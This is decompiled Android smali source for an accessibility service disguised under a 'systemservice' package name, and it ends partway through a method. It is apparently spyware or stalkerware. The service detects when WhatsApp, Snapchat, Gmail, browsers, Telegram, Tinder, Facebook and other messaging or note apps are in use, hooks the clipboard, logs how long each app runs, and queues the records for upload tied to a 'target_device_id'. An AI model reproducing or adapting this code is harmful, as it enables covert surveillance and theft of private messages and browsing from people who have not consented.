.class public Lcom/systemservice/common/boostReceiver/UIAccessibilityService;
.super Landroid/accessibilityservice/AccessibilityService;
.source ""


# static fields
.field public static a:Z = false

.field public static b:Ljava/lang/String; = ""

.field public static c:J

.field public static d:J

.field public static e:J

.field public static f:J

.field public static g:J

.field public static h:J

.field public static i:J

.field public static j:J

.field private static k:J

.field private static l:J

.field public static m:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcom/systemservice/a/e/k;",
            ">;"
        }
    .end annotation
.end field

.field public static n:Ljava/lang/String;


# instance fields
.field private A:Lcom/systemservice/a/h/k;

.field private B:Ljava/util/Date;

.field private C:Landroid/content/SharedPreferences;

.field private D:Lcom/systemservice/a/e/c;

.field private E:Lcom/systemservice/a/e/g;

.field private F:Z

.field private G:Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;

.field private o:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private p:I

.field private q:Ljava/lang/String;

.field private r:Ljava/lang/String;

.field private s:Lorg/apache/log4j/Logger;

.field private t:Lcom/systemservice/a/h/n;

.field private u:Lcom/systemservice/a/h/g;

.field private v:Ljava/lang/String;

.field private w:Ljava/lang/String;

.field private x:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private y:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private z:Lcom/systemservice/a/h/d;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->p:I

    const-string v1, ""

    iput-object v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    iput-object v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->r:Ljava/lang/String;

    iput-object v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    iput-object v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    iput-object v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    iput-object v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->y:Ljava/util/ArrayList;

    iput-boolean v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->F:Z

    new-instance v0, Lcom/systemservice/common/boostReceiver/f;

    invoke-direct {v0, p0}, Lcom/systemservice/common/boostReceiver/f;-><init>(Lcom/systemservice/common/boostReceiver/UIAccessibilityService;)V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->G:Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;

    return-void
.end method

.method static synthetic a(Lcom/systemservice/common/boostReceiver/UIAccessibilityService;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    return-object p0
.end method

.method private a(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 5

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v1, "com.whatsapp"

    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    const-string p1, "whatsapp"

    :goto_0
    iput-object p1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    :goto_1
    iput-boolean v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->F:Z

    goto/16 :goto_4

    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.snapchat.android"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string p1, "Snapchat"

    goto :goto_0

    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.google.android.gm"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string p1, "Gmail"

    goto :goto_0

    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.android.browser"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    const-string p1, "Browser"

    goto :goto_0

    :cond_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.android.chrome"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    const-string p1, "Chrome"

    goto :goto_0

    :cond_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.sec.android.app.sbrowser"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const-string p1, "SamSung Browser"

    goto :goto_0

    :cond_5
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "org.mozilla.firefox"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    const-string p1, "Firefox"

    goto :goto_0

    :cond_6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.UCMobile.intl"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    const-string p1, "UC Browser"

    goto :goto_0

    :cond_7
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.opera.browser"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    const-string p1, "Opera Browser"

    goto :goto_0

    :cond_8
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.skype.raider"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    const-string p1, "Skype"

    goto/16 :goto_0

    :cond_9
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.tencent.mm"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    const-string p1, "Wechat"

    goto/16 :goto_0

    :cond_a
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.facebook.orca"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    const-string v2, "Messenger"

    if-eqz v0, :cond_b

    :goto_2
    iput-object v2, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    goto/16 :goto_1

    :cond_b
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v3, "com.facebook.katana"

    invoke-virtual {v0, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    const-string p1, "Facebook"

    goto/16 :goto_0

    :cond_c
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v3, "kik.android"

    invoke-virtual {v0, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    const-string p1, "KIK"

    goto/16 :goto_0

    :cond_d
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v3, "com.google.android.keep"

    invoke-virtual {v0, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_e

    const-string p1, "Keep Notes"

    goto/16 :goto_0

    :cond_e
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v3, "com.samsung.android.app.notes"

    invoke-virtual {v0, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    const-string v3, "Notes"

    if-eqz v0, :cond_f

    :goto_3
    iput-object v3, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    goto/16 :goto_1

    :cond_f
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v4, "com.socialnmobile.dictapps.notepad.color.note"

    invoke-virtual {v0, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_10

    goto :goto_3

    :cond_10
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v3, "com.facebook.mlite"

    invoke-virtual {v0, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_11

    goto :goto_2

    :cond_11
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.viber.voip"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_12

    const-string p1, "Viber"

    goto/16 :goto_0

    :cond_12
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "jp.naver.line.android"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    const-string v3, "LINE"

    if-eqz v0, :cond_13

    goto :goto_3

    :cond_13
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v4, "com.tinder"

    invoke-virtual {v0, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_14

    const-string p1, "Tinder"

    goto/16 :goto_0

    :cond_14
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v4, "com.google.android.talk"

    invoke-virtual {v0, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_15

    const-string p1, "Hangouts"

    goto/16 :goto_0

    :cond_15
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v4, "org.telegram.messenger"

    invoke-virtual {v0, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_16

    const-string p1, "Telegram"

    goto/16 :goto_0

    :cond_16
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v4, "com.google.android.youtube"

    invoke-virtual {v0, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_17

    const-string p1, "Youtube"

    goto/16 :goto_0

    :cond_17
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_18

    goto/16 :goto_3

    :cond_18
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "com.tumblr"

    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_19

    const-string p1, "Tumblr"

    goto/16 :goto_0

    :cond_19
    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    invoke-static {v0, p1}, Lcom/systemservice/common/boostReceiver/b;->a(Ljava/lang/String;Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result p1

    iput-boolean p1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->F:Z

    :goto_4
    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;I)V
    .locals 17

    move-object/from16 v1, p0

    move-object/from16 v0, p1

    move-object/from16 v2, p2

    const-string v3, "send_to_server_interval"

    const-string v4, "timeMilisecondzz"

    new-instance v5, Ljava/util/Date;

    invoke-direct {v5}, Ljava/util/Date;-><init>()V

    iput-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->B:Ljava/util/Date;

    const-string v5, "android"

    const-string v6, "com.samsung"

    const-string v7, "com.sec.android"

    const-string v8, "launcher"

    const-string v9, "Settings"

    const-string v10, "home"

    const-string v11, "AUIAccessibilityService"

    const/4 v12, 0x1

    const-string v13, ""

    const-wide/16 v14, 0x3e8

    if-nez p3, :cond_4

    :try_start_0
    invoke-virtual {v0, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_3

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_3

    invoke-virtual {v0, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-nez v8, :cond_3

    invoke-virtual {v0, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-nez v7, :cond_3

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_3

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_3

    const-string v5, "timeMillisecondOpenApp"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, " timeMillisecondOpenApp = "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v7, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->k:J

    invoke-virtual {v6, v7, v8}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v7, " timeMillisecondCloseApp = "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v7, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->l:J

    invoke-virtual {v6, v7, v8}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-wide v5, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->k:J

    const-wide/16 v7, 0x0

    cmp-long v9, v5, v7

    if-eqz v9, :cond_1

    sget-wide v5, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->l:J

    cmp-long v9, v5, v7

    if-eqz v9, :cond_1

    sget-wide v5, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->l:J

    sget-wide v9, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->k:J

    cmp-long v16, v5, v9

    if-lez v16, :cond_0

    sget-wide v5, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->l:J

    sget-wide v9, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->k:J

    sub-long/2addr v5, v9

    div-long/2addr v5, v14

    cmp-long v9, v5, v7

    if-lez v9, :cond_1

    new-instance v9, Lcom/systemservice/a/e/n;

    invoke-direct {v9}, Lcom/systemservice/a/e/n;-><init>()V

    const-string v10, "TEXT IN SQLite"

    invoke-virtual {v9, v10}, Lcom/systemservice/a/e/n;->g(Ljava/lang/String;)V

    const-string v10, "App Usage History"

    invoke-virtual {v9, v10}, Lcom/systemservice/a/e/n;->f(Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    invoke-static {v10}, Lcom/systemservice/a/a/l;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Lcom/systemservice/a/e/n;->c(Ljava/lang/String;)V

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "App Name = "

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, " TimeUsage = "

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v5}, Lcom/systemservice/a/e/n;->a(Ljava/lang/String;)V

    invoke-virtual {v9, v12}, Lcom/systemservice/a/e/n;->a(I)V

    invoke-static {}, Lcom/systemservice/a/a/l;->d()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v5}, Lcom/systemservice/a/e/n;->b(Ljava/lang/String;)V

    const-string v5, "App Usage History TEXT"

    invoke-virtual {v9, v5}, Lcom/systemservice/a/e/n;->e(Ljava/lang/String;)V

    invoke-static {}, Lcom/systemservice/a/a/l;->d()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v5}, Lcom/systemservice/a/e/n;->d(Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v9, v5, v12}, Lcom/systemservice/a/a/l;->a(Lcom/systemservice/a/e/n;Landroid/content/Context;Z)V

    goto :goto_0

    :cond_0
    sget-wide v5, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->l:J

    add-long/2addr v5, v14

    sput-wide v5, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->k:J

    :cond_1
    :goto_0
    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    invoke-virtual {v5, v0}, Lcom/systemservice/a/e/c;->b(Ljava/lang/String;)V

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    invoke-virtual {v5, v2}, Lcom/systemservice/a/e/c;->a(Ljava/lang/String;)V

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->B:Ljava/util/Date;

    invoke-virtual {v5}, Ljava/util/Date;->getTime()J

    move-result-wide v5

    div-long/2addr v5, v14

    invoke-virtual {v2, v5, v6}, Lcom/systemservice/a/e/c;->b(J)V

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    const-wide/16 v5, 0x0

    invoke-virtual {v2, v5, v6}, Lcom/systemservice/a/e/c;->a(J)V

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v5, "target_device_id"

    invoke-interface {v2, v5, v13}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->z:Lcom/systemservice/a/h/d;

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    invoke-virtual {v2, v5}, Lcom/systemservice/a/h/d;->a(Lcom/systemservice/a/e/c;)V

    :cond_2
    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->s:Lorg/apache/log4j/Logger;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " is CLOSE"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " is CLOSE  11"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v11, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    :cond_3
    return-void

    :cond_4
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, " is OPEN  11"

    invoke-virtual {v12, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_9

    invoke-virtual {v0, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-nez v8, :cond_9

    const-string v8, "com.lge"

    invoke-virtual {v0, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-nez v8, :cond_9

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_9

    invoke-virtual {v0, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_9

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_9

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    invoke-virtual {v5, v0}, Lcom/systemservice/a/e/c;->b(Ljava/lang/String;)V

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    invoke-virtual {v0, v2}, Lcom/systemservice/a/e/c;->a(Ljava/lang/String;)V

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->B:Ljava/util/Date;

    invoke-virtual {v2}, Ljava/util/Date;->getTime()J

    move-result-wide v5

    const-wide/16 v7, 0x3e8

    div-long/2addr v5, v7

    invoke-virtual {v0, v5, v6}, Lcom/systemservice/a/e/c;->b(J)V

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    const-wide/16 v5, 0x1

    invoke-virtual {v0, v5, v6}, Lcom/systemservice/a/e/c;->a(J)V

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v2, "target_device_id"

    invoke-interface {v0, v2, v13}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_5

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->z:Lcom/systemservice/a/h/d;

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    invoke-virtual {v0, v2}, Lcom/systemservice/a/h/d;->a(Lcom/systemservice/a/e/c;)V

    :cond_5
    :goto_1
    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v2, "media_data_transfered_by_wifi_only"

    const/4 v5, 0x0

    invoke-interface {v0, v2, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_6

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v2, "save_battery"

    invoke-interface {v0, v2, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_6

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/systemservice/a/a/h;->c(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "TAG"

    const-string v2, "WiFi ONLY = false"

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->s:Lorg/apache/log4j/Logger;

    const-string v2, "WiFiWiFi ONLY = false"

    invoke-virtual {v0, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_6
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "line637 = "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v6, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->c:J

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lcom/systemservice/a/a/l;->l()J

    move-result-wide v6

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "timetamp - timeMilisecond = "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v8, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->c:J

    sub-long v8, v6, v8

    invoke-virtual {v0, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

